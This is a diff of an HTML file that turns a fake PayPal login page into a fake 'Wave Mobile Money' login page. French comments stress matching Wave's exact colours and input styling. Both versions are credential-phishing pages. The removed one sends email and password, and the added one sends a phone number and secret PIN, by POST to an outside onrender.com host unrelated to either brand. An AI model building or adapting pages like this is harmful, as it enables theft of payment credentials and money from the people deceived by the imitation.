@@ -1,133 +1,115 @@
 <!DOCTYPE html>
-<html lang="fr, en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion PayPal</title>
+  <title>Wave Mobile Money</title>
+
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
+      background-color: #0096FF; /* Bleu EXACT du logo Wave */
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
       margin: 0;
     }
 
-    .login-container {
-      background-color: #fff;
-      padding: 40px 30px;
-      border-radius: 8px;
-
-      /* Carré beaucoup moins visible */
-      box-shadow: 0 1px 5px rgba(0,0,0,0.1);
-      border: 1px solid #e5e5e5;
-
+    .container {
+      background-color: #0096FF; /* Même bleu pour un rendu uniforme */
+      padding: 35px 25px;
+      border-radius: 20px;
       width: 350px;
       text-align: center;
     }
 
-    .login-container img {
-      width: 120px;
-      margin-bottom: 25px;
+    img.logo {
+      width: 115px;
+      margin-bottom: 15px;
+    }
+
+    h1 {
+      color: white;
+      font-size: 28px;
+      margin: 0;
+      font-weight: bold;
     }
 
     h2 {
+      color: white;
+      font-size: 18px;
+      margin-top: 5px;
       margin-bottom: 25px;
-      color: #333;
-      font-weight: 500;
+      font-weight: normal;
     }
 
-    input {
+    /* ======= CHAMPS EXACTS WAVE ======= */
+    .input {
       width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: 1px solid #bbb;
-      box-sizing: border-box;
-      font-size: 14px;
+      margin-bottom: 15px;
     }
 
+    .input input {
+      width: 100%;
+      padding: 14px 18px;
+
+      background-color: #F5F6F7;   /* Gris clair Wave */
+      border: 1px solid #D3D5DA;   /* Bordure légère */
+      border-radius: 30px;         /* Forme arrondie Wave */
+      font-size: 16px;
+      color: #1A1A1A;
+
+      outline: none;
+    }
+
+    .input input::placeholder {
+      color: #8A8A8A;
+    }
+
+    /* ======= BOUTON ======= */
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #0070ba;
-      color: white;
+      padding: 14px;
+      margin-top: 10px;
+
+      background-color: white;
+      border-radius: 30px;
       border: none;
-      border-radius: 5px;
-      font-size: 16px;
+      font-size: 17px;
+      font-weight: bold;
+      color: #008AFF;  /* Bleu foncé wave */
       cursor: pointer;
-      margin-top: 15px;
     }
 
     button:hover {
-      background-color: #005c99;
+      background-color: #EAEAEA;
     }
 
-    .links {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #0070ba;
-    }
-
-    .links a {
-      text-decoration: none;
-      color: #0070ba;
-      margin: 0 5px;
-    }
-
-    .links a:hover {
-      text-decoration: underline;
-    }
-
-    /* Section bas de page */
-    .footer-info {
-      font-size: 11px;
-      color: #666;
-      margin-top: 20px;
-    }
-
-    .footer-info a {
-      color: #666;
-      text-decoration: none;
-      margin: 0 4px;
-    }
-
-    .footer-info a:hover {
-      text-decoration: underline;
-    }
-
-    @media (max-width: 400px) {
-      .login-container {
-        width: 90%;
-        padding: 30px 20px;
-      }
-    }
   </style>
+
 </head>
 <body>
 
-  <div class="login-container">
-    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo">
-    <h2>Connexion à PayPal</h2>
+  <div class="container">
+    <img src="pingouin.png" alt="logo" class="logo">
 
-    <form action="https://mon-projet-2-oq6y.onrender.com/save" method="POST">
-      <input type="email" name="email" placeholder="Email" required>
-      <input type="password" name="password" placeholder="Mot de passe" required>
+    <h1>Connexion</h1>
+    <h2>Wave Mobile Money</h2>
+
+    <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
+
+      <div class="input">
+        <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+      </div>
+
+      <div class="input">
+        <input type="password" name="pin" placeholder="Code secret" required>
+      </div>
+
       <button type="submit">Connexion</button>
+
     </form>
-
-    <div class="links">
-      <a href="#">Mot de passe oublié ?</a> |
-      <a href="#">Besoin d'aide ?</a>
-    </div>
-
-    <div class="footer-info">
-      <a href="#">Conditions</a> • 
-      <a href="#">Vie privée</a> • 
-      <a href="#">Sécurité</a>
-    </div>
   </div>
 
 </body>
